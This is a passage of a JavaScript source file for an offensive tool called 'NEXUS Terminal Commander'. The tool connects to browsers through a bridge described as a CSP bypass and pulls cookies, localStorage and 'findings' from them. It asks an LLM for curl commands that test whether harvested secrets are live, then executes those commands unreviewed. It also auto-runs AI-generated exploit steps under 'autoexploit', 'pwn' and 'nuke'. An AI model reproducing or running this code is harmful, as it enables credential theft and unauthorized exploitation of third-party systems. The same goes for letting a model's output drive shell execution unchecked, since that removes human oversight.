TASKS:
1. Is this a FALSE POSITIVE? (site verification codes, tracking IDs, public keys = false positive)
2. If REAL secret: provide curl command to test validity
3. Assess impact and bounty estimate

Respond in JSON only:
{
    "isFalsePositive": boolean,
    "reason": "explanation",
    "service": "exact service",
    "curlCommand": "curl ... (if testable)",
    "severity": "CRITICAL/HIGH/MEDIUM/LOW",
    "bountyEstimate": "$X-$Y"
}`;

                    const analysis = await TerminalAI.query(deepPrompt, { systemPrompt: 'Respond only with valid JSON.' });

                    if (analysis && !analysis.error) {
                        try {
                            const jsonMatch = analysis.match(/\{[\s\S]*?\}/);
                            if (jsonMatch) {
                                const parsed = JSON.parse(jsonMatch[0]);

                                if (parsed.isFalsePositive) {
                                    console.log(`${C.yellow}   ⚠️ FALSE POSITIVE: ${parsed.reason}${C.reset}`);
                                } else {
                                    console.log(`${C.green}   ✅ ${parsed.service} - ${parsed.severity}${C.reset}`);
                                    console.log(`${C.magenta}   Bounty: ${parsed.bountyEstimate}${C.reset}`);

                                    // Execute curl if provided
                                    if (parsed.curlCommand) {
                                        console.log(`${C.dim}   Executing: ${parsed.curlCommand.substring(0, 80)}...${C.reset}`);
                                        try {
                                            const { exec } = require('child_process');
                                            const curlRes = await new Promise(resolve => {
                                                exec(parsed.curlCommand, { timeout: 10000 }, (err, stdout, stderr) => {
                                                    resolve({ stdout, stderr, error: err?.message });
                                                });
                                            });

                                            if (curlRes.stdout) {
                                                const preview = curlRes.stdout.substring(0, 200);
                                                console.log(`${C.cyan}   Response: ${preview}${curlRes.stdout.length > 200 ? '...' : ''}${C.reset}`);

                                                // Quick check if response indicates valid token
                                                if (curlRes.stdout.includes('"error"') || curlRes.stdout.includes('invalid') || curlRes.stdout.includes('unauthorized')) {
                                                    console.log(`${C.dim}   ⚪ Token appears invalid${C.reset}`);
                                                } else if (curlRes.stdout.includes('"id"') || curlRes.stdout.includes('"data"') || curlRes.stdout.includes('"user"')) {
                                                    console.log(`${C.red}   🔴 TOKEN APPEARS VALID!${C.reset}`);
                                                }
                                            }
                                        } catch (e) {
                                            console.log(`${C.dim}   ⚠️ Execution error: ${e.message}${C.reset}`);
                                        }
                                    }
                                }
                            }
                        } catch (e) {
                            console.log(`${C.dim}   AI: ${analysis.substring(0, 150)}...${C.reset}`);
                        }
                    }
                }

                log('\n✅ Deep analysis complete!', 'green');
                break;

            // Exit
            case 'exit':
            case 'quit':
            case 'q':
                process.exit(0);
                break;

            default:
                // Try as shell command
                if (CommandExecutor.isAllowed(cmd)) {
                    await CommandExecutor.execute(input);
                } else {
                    log(`Unknown command: ${cmd}. Type 'help' for help.`, 'yellow');
                }
        }
    },

    // Animation demo
    async runAnimationDemo() {
        console.log(`\n${C.bold}${C.cyan}═══════════════════════════════════════${C.reset}`);
        console.log(`${C.bold}${C.cyan}   🎨 CLI ANIMATION DEMO${C.reset}`);
        console.log(`${C.bold}${C.cyan}═══════════════════════════════════════${C.reset}\n`);

        // Animated header
        await OutputManager.showAnimatedHeader('NEXUS AI SYSTEM', 'magenta');
        await OutputManager._delay(500);

        // Type writer effect
        console.log();
        await OutputManager.typeWriter('  Loading advanced modules...', 25, 'cyan');
        await OutputManager._delay(300);

        // Spinner demo
        OutputManager.startSpinner('Initializing AI engine', 'yellow');
        await OutputManager._delay(2000);
        OutputManager.stopSpinner('AI engine ready!', 'green');
        await OutputManager._delay(300);

        // Progress bar demo
        console.log();
        for (let i = 0; i <= 10; i++) {
            OutputManager.showProgress(i, 10, '  Scanning');
            await OutputManager._delay(150);
        }
        await OutputManager._delay(300);

        // Final message
        await OutputManager.typeWriter('  ✓ All systems operational!', 20, 'green');
        console.log(`\n${C.dim}Demo complete. Use 'spinner <msg>' to show spinner.${C.reset}\n`);
    },

    showHelp() {
        logBox('🔥 NEXUS TERMINAL COMMANDER v5.0 - COMMANDS', [
            '',
            `${C.red}${C.bold}🔥 AUTONOMOUS EXPLOITER:${C.reset}`,
            '  autoexploit    Start autonomous exploitation',
            '  pwn            Same as autoexploit',
            '  exploit-stop   Stop autonomous exploiter',
            '  exploit-status Show exploiter status',
            '  vulns          Show discovered vulnerabilities',
            '  scripts        Show generated scripts',
            '',
            `${C.cyan}${C.bold}🔑 TOKEN TESTER (NO RATE LIMITING):${C.reset}`,
            '  testkeys       Test ALL tokens (auto rate limit handling)',
            '  test-status    Show token tester status',
            '  livekeys       Show all LIVE/valid tokens',
            '',
            `${C.magenta}${C.bold}🧠 AI BRAIN (AUTONOMOUS THINKING):${C.reset}`,
            '  brain          Start AI Brain (autonomous mode)',
            '  brain-stop     Stop AI Brain',
            '  brain-status   Show AI Brain status',
            '  discoveries    Show AI discoveries',
            '',
            `${C.red}${C.bold}🚀 FULL AUTOMATION (ONE CLICK):${C.reset}`,
            '  fullpwn        Run EVERYTHING automatically',
            '  nuke           Same as fullpwn',
            '  fullstop       Stop all automation',
            '',
            `${C.green}${C.bold}EXECUTION:${C.reset}`,
            '  exec <cmd>     Execute shell command',
            '  curl <url>     Execute curl command',
            '  auto           Auto-exploit all findings',
            '  exploit <id>   Exploit specific finding',
            '',
            `${C.blue}${C.bold}BROWSER CONTROL:${C.reset}`,
            '  browser <js>   Execute JS in all browsers',
            '  scan           Run start() on browsers',
            '  bounty         Run bounty() on browsers',
            '  browsers       Show connected browsers',
            '',
            `${C.cyan}${C.bold}BROWSER DATA:${C.reset}`,
            '  getdata        Get all data from browsers',
            '  getfindings    Get findings from browsers',
            '  cookies        Get cookies from browsers',
            '  storage        Get localStorage/session',
            '  html [sel]     Get HTML from browsers',
            '',
            `${C.yellow}${C.bold}BROWSER ACTIONS:${C.reset}`,
            '  goto <url>     Navigate browsers to URL',
            '  click <sel>    Click element in browsers',
            '  type <s> <t>   Type text in element',
            '  fetch <url>    Fetch URL from browser',
            '  ping           Ping all browsers',
            '  sync           Full sync all browsers',
            '',
            `${C.magenta}${C.bold}AI (Primary):${C.reset}`,
            '  ai <query>     Query AI from terminal',
            '  bai <query>    Query AI through browser',
            '  ai-key <key>   Set AI API key (auto-detects)',
            '  ai-test        Test AI connection',
            '  ai-provider    Set provider manually',
            '',
            `${C.magenta}${C.bold}AI (Backups - prevents rate limits):${C.reset}`,
            '  setgroq <key>     Set Groq backup (FREE)',
            '  setopenai <key>   Set OpenAI backup',
            '  setdeepseek <key> Set DeepSeek backup',
            '  settogether <key> Set Together backup',
            '  setmistral <key>  Set Mistral backup',
            '  sethf <token>     Set HuggingFace token',
            '  resethf           Reset HuggingFace (if disabled)',
            '  backups           Show all backups',
            '  apihelp           Show API keys setup guide',
            '',
            `${C.green}${C.bold}🔑 BULK KEY POOL (NO MORE RATE LIMITS!):${C.reset}`,
            '  resetlimiter      Reset all penalties (resetrl)',
            '  addkey <p> <k>    Add single key (addkey groq gsk_xxx)',
            '  addkeys <p> k1 k2 Add multiple keys at once',
            '  bulkkeys <p>      Paste many keys (interactive)',
            '  keypool           Show all keys & status',
            '  removekey <p> <n> Remove key by number',
            '  rotatekey <p>     Force rotate to next key',
            '  savekeys          Save key pool to file',
            '  loadkeys          Load key pool from file',
            '',
            `${C.cyan}${C.bold}🚀 PRO RATE LIMITER:${C.reset}`,
            '  ratelimit         Show rate limiter status (rl)',
            '  • Token Bucket + Sliding Window algorithm',
            '  • Adaptive throttling - learns from responses',
            '  • Auto penalty/recovery system',
            '',
            `${C.green}${C.bold}📋 AI REQUEST QUEUE (SMART KEY DISTRIBUTION):${C.reset}`,
            '  queue             Show queue status (qstatus)',
            '  queue-enable      Enable smart queue (qenable)',
            '  queue-disable     Disable queue - direct requests (qdisable)',
            '  queue-clear       Clear pending requests (qclear)',
            '  • Serializes requests per key (one at a time)',
            '  • Distributes load across all keys round-robin',
            '  • Prevents simultaneous hits to same key',
            '',
            `${C.magenta}${C.bold}AI COLLABORATION:${C.reset}`,
            '  collab           Initiate AI collaboration',
            '  collab-log       Show collaboration history',
            '',
            `${C.red}${C.bold}🔬 MULTI-ANGLE ANALYSIS (automatic when report received):${C.reset}`,
            '  • ANGLE 1: Service Identification (exact API detection)',
            '  • ANGLE 2: Source-Based Attack (where was it found)',
            '  • ANGLE 3: Execute Multiple Commands (validate)',
            '  • ANGLE 4: Final Analysis (bounty assessment)',
            '',
            `${C.red}${C.bold}📊 DEEP ANALYSIS COMMANDS:${C.reset}`,
            '  deep             Deep analyze findings + run curl tests',
            '  analyze <n>      Analyze specific finding by number',
            '  findings         Show all stored findings',
            '  livekeys         Show verified LIVE tokens',
            '  results          Show successful exploits',
            '',
            `${C.cyan}${C.bold}🔄 BACKGROUND LOGS & QUIET MODE:${C.reset}`,
            '  quiet            Enable quiet mode (bg logs go to separate tab)',
            '  loud             Disable quiet mode (show all in terminal)',
            '  logs             Open background log viewer in browser',
            '  bglogs           Show recent background logs',
            '  clearlogs        Clear all background logs',
            '  bg               Show background task status',
            '  bgclear          Clear completed background tasks',
            '',
            `${C.yellow}${C.bold}🎨 OUTPUT & ANIMATIONS:${C.reset}`,
            '  clean            Toggle clean mode (suppress background logs)',
            '  demo             Run CLI animation demo',
            '  spinner <msg>    Show loading spinner',
            '  spinner stop     Stop loading spinner',
            '',
            `${C.white}${C.bold}DATA:${C.reset}`,
            '  status         Show full status',
            '  findings       Show findings',
            '  results        Show exploit results',
            '  export <file>  Export data',
            '',
            '  help           Show this help',
            '  clear          Clear screen',
            '  exit           Exit',
            ''
        ]);
    },

    showStatus() {
        const summary = DataStore.getSummary();
        const uptime = process.uptime();
        const uptimeStr = uptime > 3600 ? `${Math.floor(uptime / 3600)}h ${Math.floor((uptime % 3600) / 60)}m` : `${Math.floor(uptime / 60)}m ${Math.floor(uptime % 60)}s`;

        logBox('🔥 NEXUS STATUS', [
            `Version: ${CONFIG.VERSION}`,
            `Uptime: ${uptimeStr}`,
            `Port: ${CONFIG.PORT}`,
            '',
            `${C.green}● Connected Browsers: ${connectedBrowsers.size}${C.reset}`,
            `${TerminalAI.config.isActive ? C.green + '● AI: ACTIVE (' + CONFIG.AI_PROVIDER + ')' : C.red + '○ AI: DISABLED'}${C.reset}`,
            `${CONFIG.AI_COLLAB_MODE ? C.green + '● Collaboration: ACTIVE' : C.yellow + '○ Collaboration: OFF'}${C.reset}`,
            `${CONFIG.AUTO_SYNC ? C.green + '● Auto-Sync: ACTIVE' : C.yellow + '○ Auto-Sync: OFF'}${C.reset}`,
            '',
            `Findings: ${summary.totalFindings}`,
            `Exploit Results: ${summary.exploitResults}`,
            `Successful Exploits: ${summary.successfulExploits}`,
            `AI Collaborations: ${TerminalAI.collaborationLog?.length || 0}`,
            `AI Request Count: ${TerminalAI.config.requestCount || 0}`,
            '',
            `Browser AI Context: ${TerminalAI.browserAIContext?.domain || 'none'}`,
            `Last Sync: ${TerminalAI.browserAIContext?.lastScan || 'never'}`
        ]);
    },

    showFindings() {
        const findings = DataStore.data.findings;
        if (findings.length === 0) {
            log('No findings yet. Connect browser and run scan.', 'yellow');
            return;
        }

        console.log(`\n${C.bold}FINDINGS (${findings.length}):${C.reset}\n`);
        findings.slice(-20).forEach((f, i) => {
            console.log(`${C.cyan}[${i}]${C.reset} ${f.type || f.patternName}: ${(f.value || '').substring(0, 50)}...`);
        });
        console.log();
    },

    showResults() {
        const results = DataStore.data.exploitResults;
        if (results.length === 0) {
            log('No exploit results yet. Run aiAgent() in browser or deep command.', 'yellow');
            return;
        }

        // Separate successful and failed
        const successful = results.filter(r => r.success);
        const failed = results.filter(r => !r.success);

        console.log(`\n${C.bold}${C.green}═══════════════════════════════════════════════════════════════${C.reset}`);
        console.log(`${C.bold}${C.green}   🎯 VERIFIED CREDENTIALS & EXPLOIT RESULTS${C.reset}`);
        console.log(`${C.bold}${C.green}═══════════════════════════════════════════════════════════════${C.reset}\n`);

        if (successful.length > 0) {
            console.log(`${C.red}${C.bold}🔴 LIVE CREDENTIALS (${successful.length}):${C.reset}\n`);
            successful.forEach((r, i) => {
                console.log(`${C.red}[${i + 1}] ${r.type || 'CREDENTIAL'}${C.reset}`);
                console.log(`${C.cyan}    Service: ${r.service || 'unknown'}${C.reset}`);
                console.log(`${C.white}    Value: ${(r.value || '').substring(0, 50)}...${C.reset}`);
                console.log(`${C.yellow}    Source: ${r.source || 'unknown'}${C.reset}`);

                if (r.analysis) {
                    console.log(`${C.magenta}    Access Level: ${r.analysis.accessLevel || 'N/A'}${C.reset}`);
                    if (r.analysis.permissions?.length > 0) {
                        console.log(`${C.magenta}    Permissions: ${r.analysis.permissions.join(', ')}${C.reset}`);
                    }
                    if (r.analysis.exploitPossibilities?.length > 0) {
                        console.log(`${C.red}    Can Exploit: ${r.analysis.exploitPossibilities.join(', ')}${C.reset}`);
                    }
                    console.log(`${C.green}    Bounty Est: ${r.analysis.bountyEstimate || 'N/A'}${C.reset}`);
                }

                if (r.commands?.length > 0) {
                    console.log(`${C.dim}    Commands Tested: ${r.commands.length}${C.reset}`);
                }
                console.log();
            });
        }

        if (failed.length > 0) {
            console.log(`${C.dim}⚪ Failed/Invalid (${failed.length}):${C.reset}`);
            failed.slice(-5).forEach((r, i) => {
                console.log(`${C.dim}   [${i}] ${r.command?.substring(0, 60) || r.type || 'unknown'}...${C.reset}`);
            });
        }

        console.log(`\n${C.bold}Total: ${results.length} | Live: ${successful.length} | Failed: ${failed.length}${C.reset}\n`);
    },

    showBrowsers() {
        if (connectedBrowsers.size === 0) {
            log('No browsers connected.', 'yellow');
            return;
        }

        console.log(`\n${C.bold}CONNECTED BROWSERS (${connectedBrowsers.size}):${C.reset}\n`);
        connectedBrowsers.forEach((client, id) => {
            console.log(`${C.green}●${C.reset} ${id} - ${client.ip} (${client.tabs.length} tabs)`);
            client.tabs.forEach(tab => {
                console.log(`  └─ ${tab.url}`);
            });
        });
        console.log();
    },

    exportData(filename) {
        try {
            fs.writeFileSync(filename, JSON.stringify(DataStore.data, null, 2));
            log(`Data exported to ${filename}`, 'green');
        } catch (e) {
            log(`Export failed: ${e.message}`, 'red');
        }
    },

    async exploitFinding(index) {
        const findings = DataStore.data.findings;
        if (index < 0 || index >= findings.length) {
            log(`Invalid index. Range: 0-${findings.length - 1}`, 'red');
            return;
        }

        const finding = findings[index];
        log(`Exploiting: ${finding.type || finding.patternName}`, 'yellow');

        if (TerminalAI.config.isActive) {
            const analysis = await TerminalAI.analyzeVulnerability(finding, DataStore.data.browserData);

            try {
                const json = JSON.parse(analysis.match(/\{[\s\S]*\}/)?.[0] || '{}');

                if (json.exploitCommands && json.exploitCommands.length > 0) {
                    log('Executing AI-generated commands...', 'magenta');

                    for (const cmd of json.exploitCommands) {
                        await CommandExecutor.execute(cmd);
                    }
                }
            } catch (e) {
                console.log(analysis);
            }
        }
    },

    async autoExploit() {
        const findings = DataStore.data.findings;
        if (findings.length === 0) {
            log('No findings to exploit.', 'yellow');
            return;
        }

        log(`Auto-exploiting ${findings.length} findings...`, 'yellow');

        if (TerminalAI.config.isActive) {
            const plan = await TerminalAI.generateExploitPlan(findings, DataStore.data.browserData);

            try {
                const json = JSON.parse(plan.match(/\{[\s\S]*\}/)?.[0] || '{}');

                if (json.exploitationSteps) {
                    for (const step of json.exploitationSteps) {
                        log(`Step ${step.step}: ${step.target}`, 'blue');
                        if (step.command) {
                            await CommandExecutor.execute(step.command);
                        }
                    }
                }
            } catch (e) {
                console.log(plan);
            }
        }
    }
};

// ══════════════════════════════════════════════════════════════════════════════
// HTTP SERVER
// ══════════════════════════════════════════════════════════════════════════════

function getLocalIP() {
    const interfaces = os.networkInterfaces();
    for (const name of Object.keys(interfaces)) {
        for (const iface of interfaces[name]) {
            if (iface.family === 'IPv4' && !iface.internal) {
                return iface.address;
            }
        }
    }
    return 'localhost';
}

// ══════════════════════════════════════════════════════════════════════════════
// HTTP POLLING BRIDGE - FOR HTTPS→HTTP CSP BYPASS (NO POPUPS)
// ══════════════════════════════════════════════════════════════════════════════
// Uses fetch() with CORS to bypass mixed content restrictions.
// Browser sends commands via POST, polls for responses via GET.
// This works even from strict CSP HTTPS pages like Google Gemini.
// ══════════════════════════════════════════════════════════════════════════════

const httpSessions = new Map(); // sessionId → { authenticated, messageQueue, lastPoll, clientId }
const HTTP_SESSION_TIMEOUT = 5 * 60 * 1000; // 5 min idle timeout
const HTTP_POLL_INTERVAL = 800; // Client polls every 800ms

// Cleanup stale HTTP sessions every 60s
setInterval(() => {
    const now = Date.now();
    for (const [sid, session] of httpSessions) {
        if (now - session.lastPoll > HTTP_SESSION_TIMEOUT) {
            log(`🧹 HTTP session expired: ${sid.substring(0, 8)}`, 'dim');
            httpSessions.delete(sid);
        }
    }
}, 60000);

// CORS headers for all origins (needed for HTTPS→HTTP fetch)
function setCORSHeaders(res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Session-Id, X-Auth-Token');
    res.setHeader('Access-Control-Expose-Headers', 'X-Session-Id');
    res.setHeader('Access-Control-Max-Age', '86400');
}

// Read POST body
function readBody(req) {
    return new Promise((resolve, reject) => {
        let body = '';
        req.on('data', chunk => { body += chunk; if (body.length > 1e6) req.destroy(); });
        req.on('end', () => {
            try { resolve(JSON.parse(body)); } catch (e) { resolve({}); }
        });
        req.on('error', reject);
    });
}

// Queue a message TO the browser (browser will pick it up via /poll)
function httpQueueMessage(sessionId, message) {
    const session = httpSessions.get(sessionId);
    if (session) {
        session.messageQueue.push(message);
    }
}

// Forward HTTP session message to handleBrowserMessage (reuse WS logic)
async function handleHTTPBrowserMessage(sessionId, message) {
    const session = httpSessions.get(sessionId);
    if (!session || !session.authenticated) return;

    // Create a fake ws-like object that queues messages instead of sending via WS
    const fakeWS = {
        readyState: 1, // WebSocket.OPEN
        send(data) {
            try {
                const parsed = JSON.parse(data);
                httpQueueMessage(sessionId, parsed);
            } catch (e) {
                httpQueueMessage(sessionId, { raw: data });
            }
        }
    };

    // Reuse the existing WS message handler
    await handleBrowserMessage(session.clientId, message, fakeWS);
}

const httpServer = http.createServer(async (req, res) => {
    setCORSHeaders(res);

    // Handle CORS preflight
    if (req.method === 'OPTIONS') {
        res.writeHead(204);
        res.end();
        return;
    }

    const url = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
    const pathname = url.pathname;

    // ═══ HTTP BRIDGE: AUTH ═══
    if (pathname === '/bridge/auth' && req.method === 'POST') {
        try {
            const body = await readBody(req);
            if (body.token === CONFIG.AUTH_TOKEN) {
                const sessionId = generateToken() + generateToken();
                const clientId = generateToken().substring(0, 8);

                // Register the HTTP session
                httpSessions.set(sessionId, {
                    authenticated: true,
                    messageQueue: [],
                    lastPoll: Date.now(),
                    clientId: clientId,
                    ip: req.socket.remoteAddress,
                    connectedAt: new Date().toISOString()
                });

                // Also register in connectedBrowsers so terminal CLI sees it
                const fakeWS = {
                    readyState: 1,
                    send(data) {
                        try {
                            httpQueueMessage(sessionId, JSON.parse(data));
                        } catch (e) { }
                    }
                };
                connectedBrowsers.set(clientId, {
                    ws: fakeWS,
                    ip: req.socket.remoteAddress,
                    authenticated: true,
                    tabs: [],
                    connectedAt: new Date().toISOString(),
                    isHTTPBridge: true,
                    sessionId: sessionId
                });

                logBox('🌐 HTTP BRIDGE AUTH', [
                    `Client: ${clientId}`,
                    `Session: ${sessionId.substring(0, 12)}...`,
                    `IP: ${req.socket.remoteAddress}`,
                    `Mode: HTTP Polling (CSP Bypass)`
                ], 'green');

                // Queue welcome + auth_success
                httpQueueMessage(sessionId, {
                    type: 'welcome',
                    clientId,
                    message: 'NEXUS Terminal Commander v3.0 connected via HTTP Bridge!',
                    serverVersion: CONFIG.VERSION,
                    aiEnabled: TerminalAI.config.isActive,
                    aiCollaboration: CONFIG.AI_COLLAB_MODE,
                    autoSync: CONFIG.AUTO_SYNC,
                    capabilities: ['execute', 'ai_query', 'ai_collaboration', 'auto_sync', 'exploit', 'batch_execute']
                });
                httpQueueMessage(sessionId, {
                    type: 'auth_success',
                    aiEnabled: TerminalAI.config.isActive,
                    aiCollaboration: CONFIG.AI_COLLAB_MODE,
                    autoSync: CONFIG.AUTO_SYNC,
                    capabilities: ['execute', 'ai_query', 'ai_collaboration', 'auto_sync', 'exploit']
                });

                // Auto-sync like WS does
                if (CONFIG.AUTO_SYNC) {
                    setTimeout(() => {
                        httpQueueMessage(sessionId, { type: 'terminal_command', command: 'get_findings', data: {}, timestamp: Date.now() });
                    }, 1500);
                    setTimeout(() => {
                        httpQueueMessage(sessionId, { type: 'terminal_command', command: 'get_all_data', data: {}, timestamp: Date.now() });
                    }, 3000);
                }

                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true, sessionId, clientId }));
            } else {
                res.writeHead(401, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: false, error: 'Invalid token' }));
            }
        } catch (e) {
            res.writeHead(500, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: false, error: e.message }));
        }
        return;
    }

    // ═══ HTTP BRIDGE: POLL (browser picks up queued messages) ═══
    if (pathname === '/bridge/poll' && req.method === 'GET') {
        const sessionId = req.headers['x-session-id'] || url.searchParams.get('sid');
        const session = httpSessions.get(sessionId);

        if (!session || !session.authenticated) {
            res.writeHead(401, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: 'Invalid session' }));
            return;
        }

        session.lastPoll = Date.now();

        // Drain the message queue
        const messages = session.messageQueue.splice(0);

        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ messages }));
        return;
    }

    // ═══ HTTP BRIDGE: SEND (browser sends command to server) ═══
    if (pathname === '/bridge/send' && req.method === 'POST') {
        const sessionId = req.headers['x-session-id'] || '';
        const session = httpSessions.get(sessionId);

        if (!session || !session.authenticated) {
            res.writeHead(401, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: 'Invalid session' }));
            return;
        }

        session.lastPoll = Date.now();

        try {
            const body = await readBody(req);
            // Process via the same handler as WebSocket messages
            await handleHTTPBrowserMessage(sessionId, body);

            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true }));
        } catch (e) {
            res.writeHead(500, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: false, error: e.message }));
        }
        return;
    }

    // ═══ HTTP BRIDGE: DISCONNECT ═══
    if (pathname === '/bridge/disconnect' && req.method === 'POST') {
        const sessionId = req.headers['x-session-id'] || '';
        const session = httpSessions.get(sessionId);
        if (session) {
            connectedBrowsers.delete(session.clientId);
            httpSessions.delete(sessionId);
            log(`🔌 HTTP Bridge disconnected: ${session.clientId}`, 'yellow');
        }
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: true }));
        return;
    }

    // ═══ ORIGINAL ROUTES ═══
    if (pathname === '/health') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'ok', httpBridgeSessions: httpSessions.size, ...DataStore.getSummary() }));
    } else if (pathname === '/') {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(`
<!DOCTYPE html>
<html>
<head>
    <title>NEXUS Terminal Commander</title>
    <style>
        body { background: #0f172a; color: #e2e8f0; font-family: 'Consolas', monospace; padding: 40px; }
        h1 { color: #f43f5e; }
        .box { background: #1e293b; padding: 20px; border-radius: 8px; margin: 20px 0; }
        code { background: #334155; padding: 4px 8px; border-radius: 4px; color: #22d3ee; }
        .green { color: #22c55e; }
        .yellow { color: #eab308; }
    </style>
</head>
<body>
    <h1>🔥 NEXUS Terminal Commander v${CONFIG.VERSION}</h1>
    
    <div class="box">
        <h3>Server Status</h3>
        <p class="green">● WebSocket: ws://${getLocalIP()}:${CONFIG.PORT}</p>
        <p>Auth Token: <code>${CONFIG.AUTH_TOKEN}</code></p>
        <p>AI: ${TerminalAI.config.isActive ? '<span class="green">Enabled</span>' : '<span class="yellow">Disabled</span>'}</p>
        <p>HTTP Bridge Sessions: ${httpSessions.size}</p>
    </div>
    
    <div class="box">
        <h3>Connect from Browser Console (HTTPS pages):</h3>
        <code>connectTerminal("http://${getLocalIP()}:${CONFIG.PORT}", "${CONFIG.AUTH_TOKEN}")</code>
    </div>
    
    <div class="box">
        <h3>Connect from HTTP pages (WebSocket):</h3>
        <code>connectTerminal("ws://${getLocalIP()}:${CONFIG.PORT}", "${CONFIG.AUTH_TOKEN}")</code>
    </div>
    
    <div class="box">
        <h3>Statistics</h3>
        <p>Connected Browsers: ${connectedBrowsers.size}</p>
        <p>HTTP Bridge Sessions: ${httpSessions.size}</p>
        <p>Findings: ${DataStore.data.findings.length}</p>
        <p>Exploits Run: ${DataStore.data.exploitResults.length}</p>
    </div>
</body>
</html>
        `);
    } else {
        res.writeHead(404);
        res.end('Not Found');
    }
});

// ══════════════════════════════════════════════════════════════════════════════
// STARTUP
// ══════════════════════════════════════════════════════════════════════════════

// Display connection instructions for browser console
function displayConnectionInstructions(ip, port, token, cloudflareUrl = null) {
    const wssUrl = cloudflareUrl ? cloudflareUrl.replace('https://', 'wss://') : null;

    console.log(`
${C.red}${C.bold}================================================================================
🔥 BROWSER CONSOLE CONNECTION INSTRUCTIONS (CSP BYPASS v7.0):
================================================================================${C.reset}
`);

    if (cloudflareUrl) {
        console.log(`${C.green}${C.bold}☁️  CLOUDFLARE TUNNEL (RECOMMENDED - 100% CSP BYPASS):${C.reset}
${C.cyan}connectTerminal("${wssUrl}", "${token}")${C.reset}
${C.dim}   Works on ALL sites including Google Gemini!${C.reset}
`);
    }

    console.log(`${C.cyan}📡 LOCAL CONNECTION (HTTP pages or with port forwarding):${C.reset}
${C.yellow}connectTerminal("ws://${ip}:${port}", "${token}")${C.reset}

${C.cyan}Connection methods (auto-detected in order):${C.reset}
${C.dim}1. ${C.green}☁️ Cloudflare Tunnel${C.dim} — HTTPS/WSS, bypasses ALL CSP (if URL provided)${C.reset}
${C.dim}2. Direct WebSocket    — fastest, works on HTTP pages${C.reset}
${C.dim}3. localhost WebSocket — Chrome allows ws://localhost from HTTPS${C.reset}
${C.dim}4. HTTP Polling Bridge — fetch()-based for CORS-friendly servers${C.reset}
${C.dim}5. Popup Window Bridge — opens about:blank popup (NO CSP!)${C.reset}

${C.cyan}For WSL, set up port forwarding (Admin PowerShell):${C.reset}
${C.dim}  netsh interface portproxy add v4tov4 listenport=${port} listenaddress=127.0.0.1 connectport=${port} connectaddress=${ip}${C.reset}

${C.red}${C.bold}================================================================================${C.reset}
`);
}

async function startup() {
    console.clear();

    console.log(`
\x1b[35m\x1b[1m
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                              🔧 NEXUS AUTO-HEALER INITIALIZING...                                                ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
\x1b[0m`);

    // ═══════════════════════════════════════════════════════════════════════════
    // STEP 1: Check and install dependencies (ws module)
    // ═══════════════════════════════════════════════════════════════════════════
    await AutoHealer.checkDependencies();

    // ═══════════════════════════════════════════════════════════════════════════
    // STEP 2: Resolve port conflicts automatically
    // ═══════════════════════════════════════════════════════════════════════════
    CONFIG.PORT = await AutoHealer.resolvePortConflict(CONFIG.PORT);

    // ═══════════════════════════════════════════════════════════════════════════
    // STEP 3: Ensure cloudflared is available (download if needed)
    // ═══════════════════════════════════════════════════════════════════════════
    if (CONFIG.USE_CLOUDFLARE && !CONFIG.NO_CLOUDFLARE) {
        CONFIG.CLOUDFLARED_PATH = await AutoHealer.ensureCloudflared();
        if (!CONFIG.CLOUDFLARED_PATH) {
            console.log('\x1b[33m[AutoHealer] ⚠ Cloudflare tunnel disabled (cloudflared not available)\x1b[0m');
            CONFIG.USE_CLOUDFLARE = false;
        }
    }

    console.log(`
\x1b[32m\x1b[1m
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                              ✓ AUTO-HEALER COMPLETE - SYSTEM READY                                               ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
\x1b[0m`);

    const localIP = getLocalIP();
    console.log(`
${C.magenta}${C.bold}
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                          🔥 NEXUS TERMINAL COMMANDER v${CONFIG.VERSION} (SELF-HEALING + CSP BYPASS)                      ║
║                    Advanced Terminal with AI Collaboration & Auto-Sync                                           ║
╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
║                                                                                                                  ║
║  ${C.cyan}WebSocket: ws://${localIP}:${CONFIG.PORT}${C.magenta}                                                                         
║  ${C.yellow}Auth Token: ${CONFIG.AUTH_TOKEN}${C.magenta}                                                                      
║  ${C.green}AI: ${TerminalAI.config.isActive ? 'Enabled (' + CONFIG.AI_PROVIDER + ')' : 'Disabled (use --ai-key YOUR_KEY)'}${C.magenta}                                                                          
║  ${C.green}AI Collaboration: ${CONFIG.AI_COLLAB_MODE ? 'ACTIVE — Both AIs auto-communicate' : 'OFF'}${C.magenta}                                                 
║  ${C.green}Auto-Heal: ENABLED${C.magenta}                                                                                    
║  ${C.cyan}AI Memory: PERSISTENT (survives API key changes)${C.magenta}                                                       
║                                                                                                                  ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
${C.reset}
`);

    // Show API key tip if AI is not configured
    if (!TerminalAI.config.isActive) {
        console.log(`${C.yellow}${C.bold}
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║  💡 AI NOT CONFIGURED - Get started in 30 seconds:                                                               ║
╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
║  1. Go to: ${C.cyan}https://console.groq.com${C.yellow} (FREE, no credit card)                                                ║
║  2. Create account & get API key                                                                                 ║
║  3. Run: ${C.green}ai-key gsk_your_groq_key_here${C.yellow}                                                                    ║
║                                                                                                                  ║
